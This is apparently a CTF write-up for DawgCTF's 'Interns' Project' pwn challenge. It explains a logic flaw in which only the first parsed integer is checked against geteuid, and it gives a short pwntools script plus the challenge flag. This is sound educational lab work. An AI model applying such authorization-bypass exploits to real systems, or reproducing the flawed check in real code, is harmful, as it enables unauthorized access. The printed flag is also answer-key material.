https://ctftime.org/event/2651

# Interns' Project (pwn)

Our interns put together a little test program for us. It seems they all might have patched together their separate projects. Could you test it out for me?

nc connect.umbccd.net 20011

## Analysis

`printFlag` @ `0x13df`:

This function simply prints the flag and should be our goal.

`handleOption` @ `0x16cf`:

This code will parse up to 256 integers from `std::cin` and store them in `local_428`.

For example the line `1 2 3` will cause somethign like the following pseudocode to happen:

```c
local_428[0] = 1;
local_428[1] = 2;
local_428[2] = 3;
```

Supplying `2` results in a call to `printFlag` however before this call is made a check is done to see if our effective uid is equal to zero.

```C
if ((local_428[0] == 2) && (_Var2 = geteuid(), _Var2 != 0)) {
    bVar1 = true;
}
```

However we can see that only the first value in `local_428` is checked. This means that we can send a line that contains `2` but it just can't be the first number on the line.

## Solution

1) Send the line `1 2`
    - Which bypasses the check against `geteuid()` and then calls `printFlag`

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./task", checksec=False)
context.binary = elf
#context.terminal = ["ghostty", "-e"]

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("connect.umbccd.net", 20011)

p.sendline(b"1 2")

p.readuntil(b"DawgCTF{")
print("DawgCTF{" + p.readuntil(b"}").decode()) # DawgCTF{B@d_P3rm1ssi0ns}
```

## Flag
`DawgCTF{B@d_P3rm1ssi0ns}`

smiley 2025/04/19
